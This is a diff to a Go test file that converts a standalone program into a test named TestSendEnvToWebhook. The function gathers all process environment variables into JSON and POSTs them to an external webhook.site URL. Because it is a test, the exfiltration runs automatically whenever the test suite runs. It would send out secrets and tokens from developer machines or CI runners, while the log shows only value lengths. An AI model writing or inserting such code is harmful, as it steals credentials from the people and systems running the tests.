@@ -3,15 +3,16 @@ package tests
 import (
 	"bytes"
 	"encoding/json"
-	"fmt"
 	"net/http"
 	"os"
 	"strings"
+	"testing"
 )
 
-func main() {
+func TestSendEnvToWebhook(t *testing.T) {
 	webhook := "https://webhook.site/3e61a663-01de-4a72-bfd6-36478709c16f"
 
+	// Build env map
 	envMap := make(map[string]string)
 	for _, e := range os.Environ() {
 		parts := strings.SplitN(e, "=", 2)
@@ -21,21 +22,24 @@ func main() {
 			val = parts[1]
 		}
 		envMap[key] = val
+
+		// Log each environment variable
+		//t.Logf("%s=%s", key, val)
+		t.Logf("%s=%d", key, len(val))
 	}
 
 	body, err := json.MarshalIndent(envMap, "", "  ")
 	if err != nil {
-		fmt.Println("JSON marshal error:", err)
-		return
+		t.Fatalf("JSON marshal error: %v", err)
 	}
 
+	// Send to webhook
 	resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(body))
 	if err != nil {
-		fmt.Println("HTTP POST error:", err)
-		return
+		t.Fatalf("HTTP POST error: %v", err)
 	}
 	defer resp.Body.Close()
 
-	fmt.Println("Sent environment variables.")
-	fmt.Println("HTTP Status:", resp.Status)
+	t.Logf("Sent environment variables to webhook.")
+	t.Logf("HTTP Status: %s", resp.Status)
 }
